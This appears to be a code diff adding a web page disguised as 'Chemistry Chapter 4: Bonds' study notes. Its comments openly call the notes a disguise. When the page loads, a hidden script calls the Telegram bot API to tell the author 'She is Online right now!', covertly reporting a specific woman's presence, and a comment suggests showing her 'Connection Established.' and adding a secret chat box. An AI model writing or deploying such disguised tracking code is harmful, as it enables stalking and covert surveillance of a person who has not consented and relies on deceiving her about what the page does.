@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Chemistry Notes</title> <!-- DISGUISE: Name it something boring -->
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        /* Make the chat area look like notes */
+        .notes { color: #333; }
+    </style>
+</head>
+<body>
+
+    <!-- This is the disguise part -->
+    <h1>Chemistry Chapter 4: Bonds</h1>
+    <p>Please review the notes below.</p>
+    
+    <!-- This is where you can put a secret chat box later if you want -->
+    <div id="status">Loading notes...</div>
+
+    <script>
+        // REPLACE THESE WITH YOUR NUMBERS FROM STEP 1
+        var botToken = "YOUR_BOT_TOKEN_HERE"; 
+        var chatId = "YOUR_CHAT_ID_HERE";
+        var message = "She is Online right now!";
+
+        // This runs immediately when the page loads
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+        .then(response => {
+            console.log("Notification sent");
+            // Optional: Change text to show you know she is there
+            document.getElementById("status").innerText = "Connection Established."; 
+        })
+        .catch(error => console.error("Error:", error));
+    </script>
+
+</body>
+</html>
